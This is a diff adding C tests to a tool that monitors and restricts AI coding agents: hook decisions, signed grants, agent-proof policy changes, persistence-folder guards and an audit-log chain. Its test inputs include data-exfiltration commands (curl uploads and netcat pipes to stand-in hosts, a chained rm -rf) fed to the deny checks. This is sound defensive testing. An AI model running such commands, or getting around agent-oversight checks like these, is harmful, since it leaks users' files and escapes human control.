@@ -388,6 +388,45 @@ static void *mut_mutator(void *p) {
     return NULL;
 }
 
+/* B4: revocation reaches the extensions' read-only stores. The app revokes by
+ * deleting the grant file; the extension's next (debounced) reload must drop
+ * it even when it wasn't the newest file in the folder. */
+static void test_revocation_reaches_ro_store(void) {
+    printf("revocation reaches a read-only store (B4)\n");
+    char dir[] = "/tmp/kai-revXXXXXX";
+    if (!mkdtemp(dir)) { CHECK(0, "mkdtemp"); return; }
+    char gdir[600], polp[600], fa[700];
+    snprintf(gdir, sizeof gdir, "%s/grants", dir);
+    snprintf(polp, sizeof polp, "%s/policy", dir);
+    mkdir(gdir, 0700);
+    FILE *pf = fopen(polp, "w");
+    if (pf) { fputs("protect /secrets\n", pf); fclose(pf); }
+    const long long FUTURE = (long long)time(NULL) + 3600;
+    kai_grant_subject sub = { .pid = 100, .pidversion = 5, .agent = "claude", .strength = KAI_ID_STRONG };
+    char why[256];
+    kai_grant a = mkgrant("/secrets/a", KAI_OP_READ, KAI_GRANT_PROCESS, KAI_ID_STRONG, 100, 5, FUTURE);
+    kai_grant b = mkgrant("/secrets/b", KAI_OP_READ, KAI_GRANT_PROCESS, KAI_ID_STRONG, 100, 5, FUTURE);
+    snprintf(a.id, sizeof a.id, "rev-a"); kai_grant_sign(&a, GKEY, GKEYLEN);
+    snprintf(b.id, sizeof b.id, "rev-b"); kai_grant_sign(&b, GKEY, GKEYLEN);
+    write_grant_file(gdir, &a);
+    write_grant_file(gdir, &b);
+    /* a is older than b, so b stays the newest file after a goes */
+    snprintf(fa, sizeof fa, "%s/%s.json", gdir, a.id);
+    struct timeval old[2] = {{(time_t)(time(NULL) - 120), 0}, {(time_t)(time(NULL) - 120), 0}};
+    utimes(fa, old);
+    kai_approval_store *s = kai_approval_store_open_ro(polp, gdir, GKEY, GKEYLEN, 0);
+    CHECK(s && kai_approval_store_decide(s, "/secrets/a", NULL, KAI_OP_READ, &sub, 1000, why, sizeof why) == 1,
+          "the extension honors grant a");
+    unlink(fa);                                   /* the app's Revoke */
+    kai_approval_store_reload(s, 0);              /* the extension's next debounced reload */
+    CHECK(kai_approval_store_decide(s, "/secrets/a", NULL, KAI_OP_READ, &sub, 1000, why, sizeof why) == 0,
+          "a revoked grant that wasn't the newest file stops at the next reload");
+    CHECK(kai_approval_store_decide(s, "/secrets/b", NULL, KAI_OP_READ, &sub, 1000, why, sizeof why) == 1,
+          "the other grant still holds");
+    kai_approval_store_close(s);
+    char cmd[700]; snprintf(cmd, sizeof cmd, "rm -rf '%s'", dir); (void)system(cmd);
+}
+
 static void test_approval_store(void) {
     printf("approval store (M2)\n");
     char dir[] = "/tmp/kai-store-testXXXXXX";
@@ -603,29 +642,37 @@ static void test_pause(void) {
 }
 
 static void test_policy_agent_refusal(void) {
-    printf("policy change: the CLI routes to the control service (Step 3)\n");
+    printf("v1: the CLI never changes policy or permissions; it says where to (Kai)\n");
     char dir[] = "/tmp/kai-polguardXXXXXX";
     if (!mkdtemp(dir)) { CHECK(0, "mkdtemp"); return; }
     char polp[600]; snprintf(polp, sizeof polp, "%s/policy", dir);
     FILE *f = fopen(polp, "w");
     if (f) { fputs("storage off\n", f); fclose(f); }
-    // In v1 the production `kai policy set` never writes the policy itself: it
-    // asks the signed app's control service. With no app running, it must fail
-    // with a clear message and leave the policy untouched. (The agent-refusal
-    // itself now lives in the service; see test_control_service.)
     char outp[650]; snprintf(outp, sizeof outp, "%s/out", dir);
     char cmd[1400];
     snprintf(cmd, sizeof cmd,
              "KAI_HOME='%s' KAI_POLICY='%s' ./kai policy set storage block > '%s' 2>&1",
              dir, polp, outp);
-    (void)system(cmd);
-    /* The robust Step-3 invariant: the CLI never writes the policy itself. It
-     * routes to the app's control service (which operates on the LIVE store, not
-     * this sandbox KAI_POLICY), so the sandbox file is untouched whether the
-     * service is absent ("isn't running"), refuses an agent, or applies to the
-     * live store. */
+    int rc = system(cmd);
+    CHECK(rc != 0, "kai policy set fails (exit non-zero)");
+    CHECK(file_contains(outp, "Change this in Kai: Settings") && file_contains(outp, "Files"),
+          "...and says: change this in Kai, Settings -> Files");
     CHECK(file_contains(polp, "storage off") && !file_contains(polp, "storage block"),
-          "the CLI did NOT write the sandbox policy directly (routed to the service)");
+          "the CLI wrote nothing (the app is the only writer)");
+    snprintf(cmd, sizeof cmd, "KAI_HOME='%s' ./kai grant create --resource /x --op read > '%s' 2>&1", dir, outp);
+    (void)system(cmd);
+    CHECK(file_contains(outp, "Change this in Kai") && file_contains(outp, "Agent Control"),
+          "kai grant create: change this in Kai, Agent Control");
+    char gd[700]; snprintf(gd, sizeof gd, "%s/grants", dir);
+    CHECK(access(gd, F_OK) != 0, "...and no grant was written");
+    snprintf(cmd, sizeof cmd, "KAI_HOME='%s' KAI_POLICY='%s' ./kai policy show --json > '%s' 2>&1", dir, polp, outp);
+    CHECK(system(cmd) == 0 && file_contains(outp, "\"storage\""), "kai policy show (read-only) still works");
+
+    char *a1[] = {"set", "egress", "block"}, *a2[] = {"add", "protect", "~/x"}, *a3[] = {"add", "term", "block", "x"},
+         *a4[] = {"revoke", "id"}, *a5[] = {"add", "egress_allow", "h"};
+    CHECK(!strcmp(kai_settings_page_for(3, a1), "internet") && !strcmp(kai_settings_page_for(3, a2), "files") &&
+          !strcmp(kai_settings_page_for(4, a3), "advanced") && !strcmp(kai_settings_page_for(2, a4), "agentControl") &&
+          !strcmp(kai_settings_page_for(3, a5), "internet"), "each change maps to its Settings page");
     unlink(polp); unlink(outp); rmdir(dir);
 }
 
@@ -1851,6 +1898,818 @@ static void test_one_kai(void) {
  * and a hostname never is. So every non-allowlisted destination was "allowed by
  * grant" with no grant at all, since Oct 23. An endpoint is allowed only by a
  * real, signed CONNECT grant for that exact destination. */
+/* Login persistence (writes Ask-level, reads fine) and the location classes:
+ * creating a NEW file there is still a protected write. */
+static void test_persistence_paths(void) {
+    printf("login persistence folders: reads allowed, writes Ask (v1)\n");
+    kai_policy *p = mk("storage block\n");
+    char why[256], la[700];
+    snprintf(la, sizeof la, "%s/Library/LaunchAgents/com.evil.plist", getenv("HOME"));
+    CHECK(p && kai_path_protected(p, la, NULL, why, sizeof why) == 1 && kai_rule_is_persistence(why),
+          "~/Library/LaunchAgents/* is login persistence");
+    CHECK(kai_path_protected(p, "/Library/LaunchDaemons/x.plist", NULL, why, sizeof why) == 1 &&
+          kai_rule_is_persistence(why), "/Library/LaunchDaemons/* too");
+    CHECK(kai_path_protected(p, "/Library/LaunchAgents/x.plist", NULL, why, sizeof why) == 1 &&
+          kai_rule_is_persistence(why), "/Library/LaunchAgents/* too");
+    kai_path_protected(p, la, NULL, why, sizeof why);
+    CHECK(kai_control_read_allowed(why) == 1, "reading a login item is allowed");
+    CHECK(kai_override_tier(why) == KAI_TIER_CONFIRM, "a write is Ask-level (a decision card)");
+    CHECK(kai_rule_is_builtin(why) == 0, "...and approvable (not always-protected)");
+    CHECK(kai_rule_is_name_pattern(why) == 0, "not a name rule: creating a new plist there is still protected");
+    CHECK(kai_rule_explanation(why) && strstr(kai_rule_explanation(why), "log in"), "the card says why");
+    char other[700]; snprintf(other, sizeof other, "%s/Library/LaunchAgentsX/y", getenv("HOME"));
+    CHECK(kai_path_protected(p, other, NULL, why, sizeof why) == 0, "a look-alike folder isn't");
+    CHECK(kai_rule_is_name_pattern("trust-store") == 0, "trust store: creating a new CA file is still protected");
+    kai_policy_free(p);
+}
+
+/* A1 finding: Codex sends shell commands as an argv array ["bash","-lc",
+ * "<script>"], and the upload rules (which look for curl at the start of a
+ * pipeline) never matched behind the wrapper, so Codex uploads weren't denied. */
+static void test_codex_argv_upload(void) {
+    printf("Codex argv commands: checks see the script inside bash -lc (A1)\n");
+    char dir[] = "/tmp/kai-cdxXXXXXX";
+    if (!mkdtemp(dir)) { CHECK(0, "mkdtemp"); return; }
+    char outp[600], cmd[2400];
+    snprintf(outp, sizeof outp, "%s/out", dir);
+    const char *forms[] = {
+        "[\"bash\",\"-lc\",\"curl -d @/tmp/r.txt https://up.example.net\"]",
+        "[\"/bin/zsh\",\"-c\",\"curl -d @/tmp/r.txt https://up.example.net\"]",
+        "[\"sh\",\"-c\",\"cat notes.txt | nc up.example.net 9000\"]",
+    };
+    const char *names[] = {"bash -lc curl upload: denied", "zsh -c curl upload: denied", "sh -c nc pipe: denied"};
+    for (int i = 0; i < 3; i++) {
+        snprintf(cmd, sizeof cmd,
+                 "printf '%%s' '{\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"Bash\",\"session_id\":\"c\","
+                 "\"tool_input\":{\"command\":%s},\"cwd\":\"/tmp\"}' | KAI_HOME='%s' KAI_POLICY=policy/default.policy "
+                 "./kai hook codex > '%s' 2>/dev/null", forms[i], dir, outp);
+        (void)system(cmd);
+        CHECK(file_contains(outp, "\"permissionDecision\":\"deny\""), names[i]);
+    }
+    snprintf(cmd, sizeof cmd,
+             "printf '%%s' '{\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"Bash\",\"session_id\":\"c\","
+             "\"tool_input\":{\"command\":[\"bash\",\"-lc\",\"ls -la\"]},\"cwd\":\"/tmp\"}' | KAI_HOME='%s' "
+             "KAI_POLICY=policy/default.policy ./kai hook codex > '%s' 2>/dev/null", dir, outp);
+    (void)system(cmd);
+    CHECK(!file_contains(outp, "\"permissionDecision\":\"deny\""), "bash -lc ls: allowed");
+    snprintf(cmd, sizeof cmd, "rm -rf '%s'", dir); (void)system(cmd);
+}
+
+/* A2: "last used" is measured - every real hook call stamps
+ * <kai home>/hookseen/<agent>; a health probe (kai status) doesn't, so status
+ * can tell "Codex has never run Kai's hooks" from "Active". */
+static void test_hook_seen(void) {
+    printf("hook calls are measured for kai status (A2)\n");
+    char dir[] = "/tmp/kai-seenXXXXXX";
+    if (!mkdtemp(dir)) { CHECK(0, "mkdtemp"); return; }
+    char cmd[1600], seen[700];
+    snprintf(seen, sizeof seen, "%s/hookseen/codex", dir);
+    snprintf(cmd, sizeof cmd,
+             "printf '%%s' '{\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"Bash\",\"kai_health_probe\":true,"
+             "\"tool_input\":{\"command\":\"ls\"},\"cwd\":\"/tmp\"}' | KAI_HOME='%s' KAI_POLICY=policy/default.policy "
+             "./kai hook codex > /dev/null 2>&1", dir);
+    (void)system(cmd);
+    CHECK(access(seen, F_OK) != 0, "a health probe is not a real call (no stamp)");
+    CHECK(kai_hook_last_seen("codex") == 0 || strcmp(getenv("KAI_HOME"), dir) != 0, "...nothing recorded");
+    snprintf(cmd, sizeof cmd,
+             "printf '%%s' '{\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"Bash\",\"session_id\":\"s\","
+             "\"tool_input\":{\"command\":\"ls\"},\"cwd\":\"/tmp\"}' | KAI_HOME='%s' KAI_POLICY=policy/default.policy "
+             "./kai hook codex > /dev/null 2>&1", dir);
+    (void)system(cmd);
+    CHECK(access(seen, F_OK) == 0, "a real hook call (even an allowed one) is stamped");
+    snprintf(cmd, sizeof cmd, "rm -rf '%s'", dir); (void)system(cmd);
+}
+
+/* B1: Kai's own components get named exceptions for their own state only.
+ * Live: the network extension tried to unlink an expired grant (the store's
+ * cleanup) and the wall blocked it - cleanup is the app's job. */
+static void test_component_exceptions(void) {
+    printf("Kai components: own state only (B1)\n");
+    /* rule = what kai_path_protected matched */
+    CHECK(kai_component_may_touch("io.github.sameehj.kai.network", 0, "~/.ssh") == 0,
+          "network extension reading ~/.ssh: denied");
+    CHECK(kai_component_may_touch("io.github.sameehj.kai.network", 0, "*.key") == 0,
+          "network extension opening a key file: denied");
+    CHECK(kai_component_may_touch("io.github.sameehj.kai.network", 0, "~/.kai") == 1,
+          "network extension in Kai's own home: allowed (its own state)");
+    CHECK(kai_component_may_touch("io.github.sameehj.kai", 0, ".env") == 0,
+          "the app opening a .env: denied (it has no reason to)");
+    CHECK(kai_component_may_touch("io.github.sameehj.kai", 0, ".claude/settings.json") == 1,
+          "the app writing an agent's hook settings: allowed (installing hooks)");
+    CHECK(kai_component_may_touch("kai", 0, ".env") == 1,
+          "the kai CLI you run in a Terminal: your own tool, allowed");
+    CHECK(kai_component_may_touch("kai", 1, ".env") == 0,
+          "the kai CLI run by an agent: denied");
+    CHECK(kai_component_may_touch("io.github.sameehj.kai.network", 0, "persistence") == 0,
+          "a component writing a login item: denied");
+
+    /* read-only store (extensions): no unlink, no expiry audit, one-shots stay spent */
+    char dir[] = "/tmp/kai-rostoreXXXXXX";
+    if (!mkdtemp(dir)) { CHECK(0, "mkdtemp"); return; }
+    char gdir[600], polp[600];
+    snprintf(gdir, sizeof gdir, "%s/grants", dir); mkdir(gdir, 0700);
+    snprintf(polp, sizeof polp, "%s/policy", dir);
+    FILE *f = fopen(polp, "w"); if (f) { fputs("protect /secrets\n", f); fclose(f); }
+    kai_grant old = mkgrant("/secrets/old", KAI_OP_READ, KAI_GRANT_PROCESS, KAI_ID_STRONG, 100, 5, 1000);
+    write_grant_file(gdir, &old);
+    char oldp[700]; snprintf(oldp, sizeof oldp, "%s/%s.json", gdir, old.id);
+    kai_approval_store *ro = kai_approval_store_open_ro(polp, gdir, GKEY, GKEYLEN, 0);
+    CHECK(access(oldp, F_OK) == 0, "read-only store: an expired grant's file is NOT deleted");
+    kai_approval_store_close(ro);
+    kai_approval_store *rw = kai_approval_store_open(polp, gdir, GKEY, GKEYLEN, 0);
+    CHECK(access(oldp, F_OK) != 0, "the app's (read-write) store does the cleanup");
+    kai_approval_store_close(rw);
+
+    const long long FUTURE = (long long)time(NULL) + 3600;
+    kai_grant one = mkgrant("/secrets/one", KAI_OP_READ, KAI_GRANT_ONESHOT, KAI_ID_STRONG, 100, 5, FUTURE);
+    write_grant_file(gdir, &one);
+    kai_grant_subject sub = { .pid = 100, .pidversion = 5, .agent = "claude", .strength = KAI_ID_STRONG };
+    char why[256];
+    ro = kai_approval_store_open_ro(polp, gdir, GKEY, GKEYLEN, 0);
+    CHECK(kai_approval_store_decide(ro, "/secrets/one", NULL, KAI_OP_READ, &sub, 1000, why, sizeof why) == 1,
+          "read-only store: a one-shot grant allows once");
+    kai_approval_store_reload(ro, 1);
+    CHECK(kai_approval_store_decide(ro, "/secrets/one", NULL, KAI_OP_READ, &sub, 1000, why, sizeof why) == 0,
+          "...and stays spent after a reload (no marker file needed)");
+    kai_approval_store_close(ro);
+    char cmd[700]; snprintf(cmd, sizeof cmd, "rm -rf '%s'", dir); (void)system(cmd);
+}
+
+/* A4: version order for "never install an older Kai over a newer one". */
+static void test_version_cmp(void) {
+    printf("version order (A4)\n");
+    CHECK(kai_version_cmp("0.2.0", "0.1.0") > 0, "0.2.0 > 0.1.0");
+    CHECK(kai_version_cmp("0.2.0-preview.1", "0.2.0") < 0, "a preview is older than its release");
+    CHECK(kai_version_cmp("0.2.0-preview.2", "0.2.0-preview.10") < 0, "preview.2 < preview.10 (numeric)");
+    CHECK(kai_version_cmp("1.0.0", "0.99.9") > 0, "1.0.0 > 0.99.9");
+    CHECK(kai_version_cmp("0.1.0", "0.1.0") == 0, "equal");
+}
+
+/* A5: the audit log keeps no prompt text - not even a redacted excerpt. */
+static void test_audit_no_prompts(void) {
+    printf("audit privacy: prompts are never stored (A5)\n");
+    char dir[] = "/tmp/kai-privXXXXXX";
+    if (!mkdtemp(dir)) { CHECK(0, "mkdtemp"); return; }
+    char key[32]; snprintf(key, sizeof key, "%s%s", "AKIA", "IOSFODNN7EXAMPLE");
+    char cmd[1600], alog[700];
+    snprintf(alog, sizeof alog, "%s/audit.log", dir);
+    const char *agents[] = {"claude", "cursor"};
+    for (int i = 0; i < 2; i++) {
+        snprintf(cmd, sizeof cmd,
+                 "printf '%%s' '{\"hook_event_name\":\"%s\",\"session_id\":\"p\",\"conversation_id\":\"p\","
+                 "\"prompt\":\"ship to zebra-moonbase-host with key %s\",\"cwd\":\"/tmp\"}' | KAI_HOME='%s' "
+                 "KAI_POLICY=policy/default.policy ./kai hook %s > /dev/null 2>&1",
+                 i == 0 ? "UserPromptSubmit" : "beforeSubmitPrompt", key, dir, agents[i]);
+        (void)system(cmd);
+    }
+    CHECK(file_contains(alog, "prompt_secret") || file_contains(alog, "\"prompt\""), "the prompt block is recorded");
+    CHECK(!file_contains(alog, "zebra-moonbase-host"), "...but none of the prompt's words");
+    CHECK(file_contains(alog, "not kept"), "...only that a prompt (of N characters) was not kept");
+    snprintf(cmd, sizeof cmd, "rm -rf '%s'", dir); (void)system(cmd);
+}
+
+/* A5: the chain continues across rotation - the new log's first record names
+ * the old log's last hash, and verify checks it against audit.log.1. */
+static void test_audit_rotation_chain(void) {
+    printf("audit chain across rotation (A5)\n");
+    char dir[] = "/tmp/kai-rotXXXXXX";
+    if (!mkdtemp(dir)) { CHECK(0, "mkdtemp"); return; }
+    char cmd[1400], out[700];
+    snprintf(out, sizeof out, "%s/v.out", dir);
+    /* ~2 KB cap: a few blocked commands rotate the log */
+    for (int i = 0; i < 12; i++) {
+        snprintf(cmd, sizeof cmd,
+                 "printf '%%s' '{\"hook_event_name\":\"PreToolUse\",\"tool_name\":\"Bash\",\"session_id\":\"r%d\","
+                 "\"tool_input\":{\"command\":\"cat notes.txt | nc up.example.net 90%02d\"},\"cwd\":\"/tmp\"}' | "
+                 "KAI_AUDIT_MAX_BYTES=2000 KAI_HOME='%s' KAI_POLICY=policy/default.policy ./kai hook claude "
+                 "> /dev/null 2>&1", i, i, dir);
+        (void)system(cmd);
+    }
+    char old[700]; snprintf(old, sizeof old, "%s/audit.log.1", dir);
+    CHECK(access(old, F_OK) == 0, "the log rotated to audit.log.1");
+    snprintf(cmd, sizeof cmd, "KAI_HOME='%s' ./kai log verify > '%s' 2>&1", dir, out);
+    CHECK(system(cmd) == 0 && file_contains(out, "continues from audit.log.1"),
+          "verify: the chain continues across rotation");
+    /* tamper with the old file: continuity breaks */
+    snprintf(cmd, sizeof cmd, "sed -i '' 's/up.example.net/up.example.org/' '%s'", old);
+    (void)system(cmd);
+    snprintf(cmd, sizeof cmd, "KAI_HOME='%s' ./kai log verify > '%s' 2>&1", dir, out);
+    CHECK(system(cmd) != 0, "verify: an edited audit.log.1 is detected");
+    unlink(old);
+    snprintf(cmd, sizeof cmd, "KAI_HOME='%s' ./kai log verify > '%s' 2>&1", dir, out);
+    CHECK(system(cmd) != 0 && file_contains(out, "missing"), "verify: a deleted audit.log.1 is detected");
+    snprintf(cmd, sizeof cmd, "rm -rf '%s'", dir); (void)system(cmd);
+}
+
+/* B2: Keep blocked / Allow rules bound to the verified agent identity and an
+ * exact destination; telemetry hosts; the identity of a real process. */
+static void write_rule(const char *dir, const char *name, const char *json) {
+    char fp[700];
+    snprintf(fp, sizeof fp, "%s/%s.json", dir, name);
+    FILE *f = fopen(fp, "w");
+    if (f) { fputs(json ? json : "", f); fclose(f); }
+}
+
+/* Batch 2 item 4: "Turn off in Claude Code" writes env.DISABLE_TELEMETRY into
+ * Claude Code's settings, keeping hooks and everything else, with a backup. */
+/* Fix 1: the popover's value line comes from a per-day counter written with
+ * each audit record (not the app's 300-event buffer). Telemetry, remembered
+ * blocks, the QUIC fallback and grant records never count. */
+static void audit_one(const char *source, const char *event, const char *decision, const char *rule,
+                      const char *detail, const char *target) {
+    kai_audit_entry e;
+    memset(&e, 0, sizeof e);
+    e.source = source; e.event = event; e.decision = decision; e.rule = rule; e.detail = detail;
+    e.target = target;
+    kai_audit_write(&e);
+}
+
+static void test_daily_counter(void) {
+    printf("daily counter for the value line (fix 1)\n");
+    int s0 = 0, b0 = 0, s1 = 0, b1 = 0;
+    kai_daily_counts(NULL, &s0, &b0);
+    audit_one("storage", "claude", "block", "protected_resource", "agent open of a protected file", "/u/.ssh/id_ed25519");
+    audit_one("claude", "PreToolUse", "redact", "secret:aws_key", "cleaned", NULL);
+    audit_one("claude", "PreToolUse", "block", "secret:github_token", "secret in command", NULL);
+    audit_one("network", "claude", "block", "not_on_allowlist", "connection to up.example.net (1.2.3.4:443) is not on the allowlist", "up.example.net");
+    /* never counted */
+    audit_one("network", "claude", "block", "not_on_allowlist", "telemetry to sentry.io (1.2.3.4:443); not asked about", "sentry.io");
+    audit_one("network", "claude", "block", "not_on_allowlist", "kept blocked: you chose Keep blocked for this agent and host", "up.example.net");
+    audit_one("network", "cursor", "log", "not_on_allowlist", "QUIC (UDP 443) dropped so the agent uses HTTPS", "QUIC");
+    audit_one("grant", "requested", "request", "connect", "grant requested id=x agent=claude", "up.example.net");
+    audit_one("claude", "PreToolUse", "allow", "", "", NULL);
+    audit_one("claude", "PreToolUse", "warn", "upload", "warned", NULL);
+    kai_daily_counts(NULL, &s1, &b1);
+    CHECK(s1 - s0 == 3 && b1 - b0 == 1, "3 secrets kept, 1 other block; telemetry, kept-blocked, QUIC and grants don't count");
+
+    /* a busy day across rotations: 1500 counted events with a tiny log cap */
+    setenv("KAI_AUDIT_MAX_BYTES", "20000", 1);
+    kai_daily_counts(NULL, &s0, &b0);
+    for (int i = 0; i < 1500; i++)
+        audit_one("network", "claude", "block", "not_on_allowlist", "connection to busy.example.net is not on the allowlist", "busy.example.net");
+    unsetenv("KAI_AUDIT_MAX_BYTES");
+    kai_daily_counts(NULL, &s1, &b1);
+    char old[1200]; snprintf(old, sizeof old, "%s.1", kai_audit_path());
+    CHECK(access(old, F_OK) == 0, "the busy day rotated the log");
+    CHECK(b1 - b0 == 1500 && s1 == s0, "the counter kept all 1500 across rotation (the UI buffer holds 300)");
+    CHECK(kai_daily_counts("1999-01-01", &s1, &b1) == 0 && s1 == 0 && b1 == 0, "another day starts at zero");
+}
+
+/* Fix 2: with no session to bind to, "Allow <agent> to reach <host> for 1
+ * hour" is a signed rule bound to the verified identity that expires. */
+static void test_temporary_rule(void) {
+    printf("1-hour allow by verified identity (fix 2)\n");
+    char dir[] = "/tmp/kai-trXXXXXX";
+    if (!mkdtemp(dir)) { CHECK(0, "mkdtemp"); return; }
+    const unsigned char key[] = "rules-test-key-0123456789abcdef";
+    const char *claude = "com.anthropic.claude-code (Q6L2SF6YDW)";
+    long long now = (long long)time(NULL);
+    char id[40];
+    char *t = kai_rule_build_json_until("t1", KAI_RULE_ALLOW, claude, "claude", "api.example.org",
+                                        KAI_OP_CONNECT, now, now + 3600, 0, key, sizeof key - 1);
+    CHECK(t != NULL, "a 1-hour allow needs no owner authentication");
+    write_rule(dir, "t1", t);
+    CHECK(kai_rule_lookup(dir, claude, "api.example.org", KAI_OP_CONNECT, key, sizeof key - 1, id, sizeof id)
+              == KAI_RULE_ALLOW, "it allows that agent and host now");
+    CHECK(kai_rule_lookup(dir, "codex (2DC432GLL2)", "api.example.org", KAI_OP_CONNECT, key, sizeof key - 1, id, sizeof id) == 0,
+          "...only for that signed agent");
+    /* tampering with the expiry breaks the signature */
+    char *x = t ? strdup(t) : NULL;
+    char num[32]; snprintf(num, sizeof num, "%lld", now + 3600);
+    char *at = x ? strstr(x, num) : NULL;
+    if (at) at[0] = at[0] == '9' ? '1' : '9';
+    write_rule(dir, "t1", x);
+    CHECK(kai_rule_lookup(dir, claude, "api.example.org", KAI_OP_CONNECT, key, sizeof key - 1, id, sizeof id) == 0,
+          "an edited expiry doesn't verify");
+    free(x); free(t);
+
+    char *old = kai_rule_build_json_until("t2", KAI_RULE_ALLOW, claude, "claude", "old.example.org",
+                                          KAI_OP_CONNECT, now - 7200, now - 3600, 0, key, sizeof key - 1);
+    write_rule(dir, "t2", old);
+    free(old);
+    CHECK(kai_rule_lookup(dir, claude, "old.example.org", KAI_OP_CONNECT, key, sizeof key - 1, id, sizeof id) == 0,
+          "an expired allow stops");
+    CHECK(kai_rule_build_json_until("t3", KAI_RULE_ALLOW, claude, "claude", "api.example.org", KAI_OP_CONNECT,
+                                    now, now + 3 * 86400, 0, key, sizeof key - 1) == NULL,
+          "longer than a day without owner authentication: refused");
+    CHECK(kai_rule_build_json_until("t4", KAI_RULE_ALLOW, claude, "claude", "203.0.113.5:443", KAI_OP_CONNECT,
+                                    now, now + 3600, 0, key, sizeof key - 1) == NULL,
+          "never for an address with no hostname");
+    char cmd[700]; snprintf(cmd, sizeof cmd, "rm -rf '%s'", dir); (void)system(cmd);
+}
+
+/* Spec §5.3: Preview 1's terminal rules (kai allow / block / rules / undo),
+ * the hosts a command reaches, and refusing inside an agent. */
+static void test_agent_rules(void) {
+    printf("terminal grants: agent + operation + target + expiry (spec v2.1 A.6)\n");
+    char hosts[8][256];
+    int n = kai_command_hosts("curl -sS -d @notes.txt https://Up.Example.net:8443/x?y=1", hosts, 8);
+    CHECK(n == 1 && !strcmp(hosts[0], "up.example.net"), "a URL's host, lowercased, no port");
+    n = kai_command_hosts("scp notes.txt deploy@db.example.com:/tmp && nc paste.example.org 9000 < notes.txt", hosts, 8);
+    CHECK(n == 2 && !strcmp(hosts[0], "db.example.com") && !strcmp(hosts[1], "paste.example.org"),
+          "scp user@host: and nc <host>");
+
+    char f[1024], h[256], form[16];
+    CHECK(kai_upload_parse("curl -sS -d @notes.txt https://up.example.net/x", f, sizeof f, h, sizeof h, form, sizeof form)
+              && !strcmp(f, "notes.txt") && !strcmp(h, "up.example.net") && !strcmp(form, "curl"),
+          "upload parse: curl -d @file URL");
+    CHECK(kai_upload_parse("curl -F 'doc=@./a.pdf;type=application/pdf' https://x.example/u", f, sizeof f, h, sizeof h, form, sizeof form)
+              && !strcmp(f, "./a.pdf"), "upload parse: curl -F name=@file;type=");
+    CHECK(kai_upload_parse("scp -P 2222 build.tgz deploy@db.example.com:/srv", f, sizeof f, h, sizeof h, form, sizeof form)
+              && !strcmp(f, "build.tgz") && !strcmp(h, "db.example.com") && !strcmp(form, "scp"), "upload parse: scp");
+    CHECK(!kai_upload_parse("cat notes.txt | curl -d @- https://x.example", f, sizeof f, h, sizeof h, form, sizeof form),
+          "upload parse: a pipe isn't identified");
+    CHECK(!kai_upload_parse("curl -d @a.txt -d @b.txt https://x.example", f, sizeof f, h, sizeof h, form, sizeof form),
+          "upload parse: two files aren't identified");
+    CHECK(!kai_upload_parse("nc x.example 9000 < notes.txt", f, sizeof f, h, sizeof h, form, sizeof form),
+          "upload parse: a redirect isn't identified");
+    CHECK(!kai_upload_parse("curl -d @a.txt https://x.example; rm -rf x", f, sizeof f, h, sizeof h, form, sizeof form),
+          "upload parse: two commands aren't identified");
+
+    char dir[] = "/tmp/kai-grXXXXXX";
+    if (!mkdtemp(dir)) { CHECK(0, "mkdtemp"); return; }
+    char env[700], other[700], link[700], rp[1200];
+    snprintf(env, sizeof env, "%s/.env", dir);
+    snprintf(other, sizeof other, "%s/other.txt", dir);
+    snprintf(link, sizeof link, "%s/link.env", dir);
+    snprintf(rp, sizeof rp, "%s/agent-rules.json", kai_home());
+    unlink(rp);
+    FILE *w = fopen(env, "w"); if (w) { fputs("A=1\n", w); fclose(w); }
+    w = fopen(other, "w"); if (w) { fputs("B=2\n", w); fclose(w); }
+    long long now = (long long)time(NULL);
+
+    CHECK(kai_cli_grant_add(1, "read", "claude", ".env", NULL, now + 3600, dir, NULL, 0) == 0,
+          "allow-file .env --read, relative to the user's folder");
+    CHECK(kai_cli_grant_allows("read", "claude", env, NULL, "/", now), "the read grant applies to that file");
+    CHECK(kai_cli_grant_allows("read", "claude", ".env", NULL, dir, now), "...also when the agent names it relatively");
+    CHECK(!kai_cli_grant_allows("write", "claude", env, NULL, "/", now), "a read grant doesn't allow writing");
+    CHECK(!kai_cli_grant_allows("upload", "claude", env, "up.example.net", "/", now), "...or uploading");
+    CHECK(!kai_cli_grant_allows("read", "codex", env, NULL, "/", now), "two agents, one grant: the other isn't covered");
+    CHECK(!kai_cli_grant_allows("read", "claude", env, NULL, "/", now + 7200), "an expired grant stops applying");
+
+    symlink(env, link);
+    CHECK(kai_cli_grant_allows("read", "claude", link, NULL, "/", now), "a symlink to the granted file resolves to it");
+    unlink(env);
+    symlink(other, env);
+    CHECK(!kai_cli_grant_allows("read", "claude", env, NULL, "/", now), "the path re-linked elsewhere: grant doesn't apply");
+    unlink(env);
+    w = fopen(env, "w"); if (w) { fputs("A=1\n", w); fclose(w); }
+    CHECK(!kai_cli_grant_allows("read", "claude", env, NULL, "/", now), "the file replaced by a new one: grant doesn't apply");
+
+    CHECK(kai_cli_grant_add(1, "upload", "claude", env, "up.example.net", now + 3600, NULL, NULL, 0) == 0, "allow-upload");
+    CHECK(kai_cli_grant_allows("upload", "claude", env, "UP.example.net", "/", now), "upload grant: that file to that host");
+    CHECK(!kai_cli_grant_allows("upload", "claude", env, "evil.example", "/", now), "...not another host");
+    CHECK(kai_cli_grant_add(1, "mcp", "claude", "notion", "search", now + 3600, NULL, NULL, 0) == 0, "allow-mcp server tool");
+    CHECK(kai_cli_grant_allows("mcp", "claude", "notion", "search", NULL, now) &&
+          !kai_cli_grant_allows("mcp", "claude", "notion", "delete_page", NULL, now), "mcp grant: only that tool");
+    CHECK(kai_cli_grant_add(1, "fetch", "claude", "Docs.Example.org", NULL, now + 3600, NULL, NULL, 0) == 0 &&
+          kai_cli_grant_allows("fetch", "claude", "docs.example.org", NULL, NULL, now) &&
+          !kai_cli_grant_allows("fetch", "claude", "api.docs.example.org", NULL, NULL, now),
+          "fetch grant: exactly that host, never a subdomain");
+    CHECK(kai_cli_grant_add(0, "reach", "*", "example.org", NULL, 0, NULL, NULL, 0) == 0 &&
+          kai_agent_rule_for("cursor", "cdn.example.org", now) == KAI_AGENT_RULE_BLOCK, "a block covers subdomains, every agent");
+    CHECK(kai_agent_rule_undo() == 0 && kai_agent_rule_for("cursor", "example.org", now) == 0, "undo reverses the last change");
+    CHECK(kai_cli_grant_allows("mcp", "claude", "notion", "search", NULL, now), "...and only the last");
+    unlink(rp);
